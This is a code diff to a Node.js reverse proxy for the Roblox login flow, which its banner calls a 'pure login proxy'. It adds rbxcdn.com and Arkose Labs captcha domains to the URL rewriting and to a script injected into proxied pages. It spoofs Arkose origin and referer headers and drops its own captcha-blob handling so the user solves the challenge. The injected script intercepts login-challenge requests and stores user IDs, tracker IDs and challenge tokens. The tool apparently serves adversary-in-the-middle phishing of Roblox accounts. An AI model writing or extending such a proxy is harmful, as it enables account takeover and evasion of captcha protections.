@@ -6,7 +6,7 @@ const http = require('http');
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - WITH CHAINED CHALLENGE SUPPORT');
+console.log('🔒 PURE LOGIN PROXY - WITH FULL ARKOSE SUPPORT');
 console.log('='.repeat(60));
 
 // Shared HTTPS agent with keep-alive for connection pooling
@@ -59,6 +59,11 @@ const SUBDOMAIN_MAP = {
     'client-telemetry': 'https://client-telemetry.roblox.com',
     'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
     'metrics':        'https://metrics.roblox.com',
+    
+    // CRITICAL: rbxcdn.com domains for captcha
+    'apis-rbxcdn':    'https://apis.rbxcdn.com',
+    'captcha-rbxcdn': 'https://captcha.rbxcdn.com',
+    'arkoselabs-rbxcdn': 'https://arkoselabs.roblox.com',
     
     // ARKOSE LABS (FunCaptcha) - Critical for captcha challenges
     'arkose-api':     'https://roblox-api.arkoselabs.com',
@@ -136,8 +141,13 @@ function rewriteChallengeMetadata(metadata, host) {
 function rewriteArkoseUrl(url, host) {
     if (!url || typeof url !== 'string') return url;
     
-    // Arkose Labs domains
-    const arkoseDomains = [
+    // All domains that need to be proxied
+    const domains = [
+        // rbxcdn domains
+        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
+        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
+        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
+        // Arkose Labs domains
         ['https://roblox-api.arkoselabs.com', `https://${host}/arkose-api`],
         ['https://client-api.arkoselabs.com', `https://${host}/arkose-client`],
         ['https://cdn.arkoselabs.com', `https://${host}/arkose-cdn`],
@@ -153,7 +163,7 @@ function rewriteArkoseUrl(url, host) {
         ['https://challenge.roblox.com', `https://${host}/challenge`],
     ];
     
-    for (const [from, to] of arkoseDomains) {
+    for (const [from, to] of domains) {
         if (url.startsWith(from)) {
             return url.replace(from, to);
         }
@@ -426,6 +436,11 @@ function buildInjectedScript(host) {
     
     // Arkose Labs domains for captcha
     var ARKOSE_DOMAINS = [
+        // rbxcdn domains (CRITICAL!)
+        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
+        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
+        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
+        // Arkose Labs domains
         ["https://roblox-api.arkoselabs.com", PROXY_HOST + "/arkose-api"],
         ["https://client-api.arkoselabs.com", PROXY_HOST + "/arkose-client"],
         ["https://cdn.arkoselabs.com", PROXY_HOST + "/arkose-cdn"],
@@ -459,7 +474,6 @@ function buildInjectedScript(host) {
     window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
     window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
     window.__rblxCaptchaToken = sessionStorage.getItem('__rblxCaptchaToken') || null;
-    window.__rblxDataExchangeBlob = sessionStorage.getItem('__rblxDataExchangeBlob') || null;
     
     if (window.__rblxChallengeId) {
         log('Restored challenge state from sessionStorage', {
@@ -481,7 +495,6 @@ function buildInjectedScript(host) {
         if (window.__rblxBrowserTrackerId) sessionStorage.setItem('__rblxBrowserTrackerId', window.__rblxBrowserTrackerId);
         if (window.__rblxChallengeToken) sessionStorage.setItem('__rblxChallengeToken', window.__rblxChallengeToken);
         if (window.__rblxCaptchaToken) sessionStorage.setItem('__rblxCaptchaToken', window.__rblxCaptchaToken);
-        if (window.__rblxDataExchangeBlob) sessionStorage.setItem('__rblxDataExchangeBlob', window.__rblxDataExchangeBlob);
         sessionStorage.setItem('__rblxChallengeSolved', window.__rblxChallengeSolved ? 'true' : 'false');
     }
 
@@ -641,16 +654,7 @@ function buildInjectedScript(host) {
                                     
                                     // Handle captcha challenge specifically
                                     if (data.challengeType === 'captcha') {
-                                        window.__rblxDataExchangeBlob = meta.dataExchangeBlob;
-                                        log('CAPTCHA challenge with dataExchangeBlob stored');
-                                        
-                                        // Trigger captcha render if Arkose is available
-                                        if (window.arkose && window.arkose.render) {
-                                            log('Triggering Arkose captcha render...');
-                                            window.arkose.render(meta.dataExchangeBlob);
-                                        } else {
-                                            log('Arkose not ready yet, blob stored for later');
-                                        }
+                                        log('CAPTCHA challenge detected - waiting for user to solve');
                                     }
                                 } catch(e) {
                                     log('Failed to parse chained challenge metadata:', e.message);
@@ -752,14 +756,6 @@ function buildInjectedScript(host) {
                             window.__rblxChallengeType = data.challengeType;
                             window.__rblxChallengeSolved = false;
                             window.__rblxCaptchaToken = null;
-                            
-                            if (data.challengeMetadata) {
-                                var meta = JSON.parse(data.challengeMetadata);
-                                if (data.challengeType === 'captcha' && meta.dataExchangeBlob) {
-                                    window.__rblxDataExchangeBlob = meta.dataExchangeBlob;
-                                    log('XHR: CAPTCHA blob stored');
-                                }
-                            }
                             saveChallengeState();
                         } else if (self.status === 200) {
                             log('XHR Challenge continue succeeded, marking as solved');
@@ -851,7 +847,6 @@ function buildInjectedScript(host) {
         window.__rblxChallengeSolved = false;
         window.__rblxChallengeToken = null;
         window.__rblxCaptchaToken = null;
-        window.__rblxDataExchangeBlob = null;
         sessionStorage.removeItem('__rblxChallengeId');
         sessionStorage.removeItem('__rblxChallengeType');
         sessionStorage.removeItem('__rblxUserId');
@@ -859,7 +854,6 @@ function buildInjectedScript(host) {
         sessionStorage.removeItem('__rblxChallengeSolved');
         sessionStorage.removeItem('__rblxChallengeToken');
         sessionStorage.removeItem('__rblxCaptchaToken');
-        sessionStorage.removeItem('__rblxDataExchangeBlob');
         log('Challenge state cleared');
     };
     
@@ -872,8 +866,7 @@ function buildInjectedScript(host) {
             browserTrackerId: window.__rblxBrowserTrackerId,
             challengeSolved: window.__rblxChallengeSolved,
             challengeToken: window.__rblxChallengeToken,
-            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no',
-            dataExchangeBlob: window.__rblxDataExchangeBlob ? 'yes' : 'no'
+            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
         };
     };
 
@@ -951,7 +944,7 @@ function buildInjectedScript(host) {
         });
     }
 
-    log('Proxy interceptor loaded with CHAINED CHALLENGE support');
+    log('Proxy interceptor loaded with FULL ARKOSE support');
     log('Challenge state:', window.getRblxChallengeState());
 })();
 </script>`;
@@ -1008,7 +1001,7 @@ app.options('*', (req, res) => {
 
 function createRobloxProxy(prefix, target) {
     const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
-    const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com');
+    const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com') || target.includes('rbxcdn.com');
     
     return createProxyMiddleware({
         target,
@@ -1021,7 +1014,7 @@ function createRobloxProxy(prefix, target) {
         
         on: {
             proxyReq: (proxyReq, req) => {
-                // For Arkose, use their own origin/referer
+                // For Arkose/rbxcdn, use their own origin/referer
                 if (isArkose) {
                     const arkoseOrigin = target.replace(/\/+$/, '');
                     proxyReq.setHeader('origin', arkoseOrigin);
@@ -1130,10 +1123,13 @@ app.use('/', createProxyMiddleware({
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Proxy running on port ${PORT}`);
-    console.log(`📋 Arkose Labs (FunCaptcha) domains mapped:`);
+    console.log(`📋 rbxcdn.com domains mapped:`);
+    console.log(`   - apis.rbxcdn.com → /apis-rbxcdn`);
+    console.log(`   - captcha.rbxcdn.com → /captcha-rbxcdn`);
+    console.log(`   - arkoselabs.roblox.com → /arkoselabs-rbxcdn`);
+    console.log(`📋 Arkose Labs domains mapped:`);
     console.log(`   - roblox-api.arkoselabs.com → /arkose-api`);
     console.log(`   - client-api.arkoselabs.com → /arkose-client`);
     console.log(`   - cdn.arkoselabs.com → /arkose-cdn`);
     console.log(`   - funcaptcha.com → /arkose-funcaptcha`);
-    console.log(`   - And 7 more Arkose domains...`);
 });
